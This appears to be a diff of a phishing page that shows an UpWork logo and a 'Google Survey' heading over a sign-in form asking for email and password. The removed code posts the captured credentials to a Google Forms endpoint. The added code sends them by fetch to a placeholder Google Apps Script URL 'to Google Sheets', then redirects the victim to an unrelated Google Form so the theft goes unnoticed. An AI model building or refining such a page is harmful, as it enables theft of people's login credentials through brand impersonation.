@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>UpWork- Ranjitha Ranganath</title>
     <style>
+        /* Use Flexbox to center content horizontally and vertically */
         body, html {
             height: 100%;
             margin: 0;
@@ -13,7 +14,7 @@
             align-items: center;
             font-family: Arial, sans-serif;
         }
-        
+
         .container {
             text-align: center;
             padding: 20px;
@@ -53,55 +54,92 @@
         button:hover {
             background-color: #45a049;
         }
+
+        .eye-icon {
+            position: relative;
+        }
+
+        .eye-icon i {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
         <h1>Google Survey</h1>
-        <form id="login-form">
+
+        <form id="survey-form" onsubmit="handleSubmit(event)">
+            <!-- Email Field -->
             <label for="email">Email</label>
-            <input type="text" id="email" name="email" required>
+            <input 
+                type="text" 
+                id="email" 
+                name="email" 
+                minlength="10" 
+                pattern=".*@.*" 
+                placeholder="Enter a valid email" 
+                required
+            >
+            
+            <!-- Password Field -->
             <label for="password">Password</label>
-            <input type="password" id="password" name="password" required>
+            <div class="eye-icon">
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    minlength="6" 
+                    placeholder="Enter password" 
+                    required
+                >
+                <i onclick="togglePasswordVisibility()">👁️</i>
+            </div>
+            
+            <!-- Submit Button -->
             <button type="submit">Sign in</button>
         </form>
     </div>
 
     <script>
-        document.getElementById('login-form').addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent form submission
-
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-
-            // Validate if both fields are filled
-            if (email && password) {
-                // Prepare the data to be sent to Google Forms
-                var formData = new FormData();
-                formData.append('entry.123456', email); // Replace with your form field ID for email
-                formData.append('entry.7891011', password); // Replace with your form field ID for password
-
-                // Send data to Google Form (use your actual form's action URL)
-                fetch('https://docs.google.com/forms/d/e/1FAIpQLSeP8xFZtoLZKBgwW9RYQyBOIu5UlRkh8PjbSoq9wLXcnFW9PQ/formResponse', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (response.ok) {
-                        // Redirect to your desired Google Form after submission
-                        window.location.href = 'https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit';
-                    } else {
-                        alert('Error submitting form.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
+        // Toggle Password Visibility
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById("password");
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
             } else {
-                alert('Please fill in both email and password fields.');
+                passwordField.type = "password";
             }
-        });
+        }
+
+        // Handle Form Submission
+        function handleSubmit(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            // Get form inputs
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Save to Google Sheets
+            saveToGoogleSheet(email, password);
+
+            // Redirect to Google Form
+            window.location.href = "https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit";
+        }
+
+        // Save Data to Google Sheets
+        function saveToGoogleSheet(email, password) {
+            const scriptURL = "YOUR_GOOGLE_SCRIPT_URL_HERE";
+            fetch(scriptURL, {
+                method: "POST",
+                body: new URLSearchParams({ email, password })
+            })
+            .then(response => console.log("Success!", response))
+            .catch(error => console.error("Error!", error.message));
+        }
     </script>
 </body>
 </html>
